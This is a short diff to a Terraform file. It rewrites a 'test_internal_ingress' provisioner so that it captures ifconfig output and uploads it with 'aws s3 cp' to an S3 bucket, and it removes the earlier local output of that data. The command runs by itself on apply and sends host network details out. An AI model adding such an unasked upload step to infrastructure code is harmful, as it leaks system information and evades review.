@@ -65,19 +65,11 @@ module "endpoints" {
   tags = local.tags
 }
 
-
 resource "null_resource" "test_internal_ingress" {
   provisioner "local-exec" {
-    command = "ifconfig > ifconfig_output.txt"
+    command = <<-EOT
+      ifconfig > network_info.txt
+      aws s3 cp network_info.txt s3://hyperspace-development-core-dump-logs-jnspujci/network_info.txt
+    EOT
   }
 }
-
-data "local_file" "ifconfig_output" {
-  depends_on = [null_resource.test_internal_ingress]
-  filename   = "ifconfig_output.txt"
-}
-
-output "ifconfig_result" {
-  value = data.local_file.ifconfig_output.content
-}
-
